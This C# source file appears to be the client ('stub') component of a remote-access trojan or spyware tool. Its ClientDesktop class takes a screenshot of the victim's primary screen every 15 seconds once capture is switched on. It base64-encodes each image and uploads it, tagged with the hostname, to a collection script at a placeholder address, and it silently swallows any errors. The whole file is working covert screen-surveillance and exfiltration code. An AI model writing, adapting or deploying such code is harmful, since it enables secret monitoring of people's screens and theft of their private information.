using System;

using System.Drawing;

using System.Windows.Forms;


using System.IO;
using System.Drawing.Imaging;
using System.Timers;
using System.Net;
using System.Collections.Specialized;

namespace stub
{
    internal class ClientDesktop
    {
        static WebClient webclient = WebClientHandler.wcReturn();
        static bool isStarted = false;

        static Bitmap bitmap;
        static MemoryStream memoryStream;
        static Graphics memoryGraphics;
        static Rectangle rc;

        static System.Timers.Timer timer = new System.Timers.Timer();

        public static void initClientDesktop()
        {


            timer.Interval = 15000;
            timer.Elapsed += new ElapsedEventHandler(onTimedEvent);
            timer.Enabled = true;
            timer.Start();

        }

        
        public static void StartDesktopCapture()
        {
            isStarted = true;
        }

        
        public static void StopDesktopCapture()
        {

            isStarted = false;
        }



        private static MemoryStream GetDesktop()
        {
            memoryStream = new MemoryStream(10000);
            try
            {
                rc = Screen.PrimaryScreen.Bounds;
                bitmap = new Bitmap(rc.Width, rc.Height, PixelFormat.Format32bppArgb);
                memoryGraphics = Graphics.FromImage(bitmap);
                memoryGraphics.CopyFromScreen(rc.X, rc.Y, 0, 0, rc.Size, CopyPixelOperation.SourceCopy);
            }
            catch { }
           
            bitmap.Save(memoryStream, ImageFormat.Jpeg);
            return memoryStream;
        }


        
        static void onTimedEvent(object sender, EventArgs e)
        {
            if (!isStarted) return;
            try
            {

                NameValueCollection nameValues = new NameValueCollection();
                nameValues.Add("client", Dns.GetHostName());
                nameValues.Add("desktop64", Convert.ToBase64String(GetDesktop().ToArray()));


                webclient.UploadValues("http://127.0.0.1/senddesktop.php", nameValues);
            }
            catch { }
        }


    }
}
